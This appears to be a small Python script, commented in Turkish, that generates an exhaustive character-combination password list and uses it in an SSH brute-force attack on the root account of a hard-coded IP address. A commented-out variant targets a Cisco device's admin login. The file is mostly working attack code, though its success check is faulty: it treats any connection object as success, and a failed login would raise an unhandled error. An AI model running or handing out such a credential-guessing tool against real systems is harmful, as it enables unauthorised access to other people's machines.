import re, pyautogui,paramiko,time

# Python 3.7 32-bit
# pip install pyautogui
# pip install paramiko


def genPassword(lenght,charSets):
    verbLengt=[0 for i in range(lenght)]
    sifrelertxt=open("sifreler.txt","w")
    while True:
        if(verbLengt[0]==len(charSets)):
            break
        newVerb=""
        for i in range(lenght):
            newVerb+=charSets[verbLengt[i]]
        sifrelertxt.write(newVerb+"\n")
        for i in range(lenght-1,-1,-1):
            if(i==0 and verbLengt[0] + 1 == len(charSets)):
                verbLengt[0]+=1
                break
            elif(verbLengt[i] + 1 < len(charSets)):
                verbLengt[i]+=1
                break
            else:
                verbLengt[i]=0
    sifrelertxt.close()


def StartGenerator():
    verbs=input("Lütfen Kelimeleri Giriniz: ")
    lenght=int(input("Lütfen Basamak Uzunluğunu Giriniz: "))
    verbs=re.sub('[^A-Za-z0-9]+', '', verbs)
    charSets=list(set(verbs))
    genPassword(lenght,charSets)



def readSifreler():
    sifrelertxt=open("sifreler.txt","r")
    conunt=0;
    for x in sifrelertxt:
        print(x.replace('\n', ''),end=" , ")
        conunt+=1
    print("\n")
    print(conunt)
    sifrelertxt.close()


#StartGenerator()
#print("Üretiyorum")
#print("Okuyorum")
#readSifreler()





#def bruteForceAttack():
#    sifrelertxt=open("sifreler.txt","r")
#    for x in sifrelertxt:
#        key=x.replace('\n', '')
#        try:
#            net_connect=netmiko.ConnectHandler(ip="20.20.20.20",device_type="cisco_ios",username="admin",password=str(key))
#            print("Doğru Şifre"+key)
#            sifrelertxt.close()
#            break
#        except NetmikoAuthenticationException:
#            print("Yanlış Şifre")
#            continue       
#    sifrelertxt.close()

def bruteForceAttack():
    conn = paramiko.SSHClient()
    conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sifrelertxt=open("sifreler.txt","r")
    for x in sifrelertxt:
        key=x.replace('\n', '')
        conn.connect("129.9.0.104", 22, "root", key)   
        time.sleep(.5)
        if conn:
            print("Doğru Şifre: " + key)
            break
    sifrelertxt.close()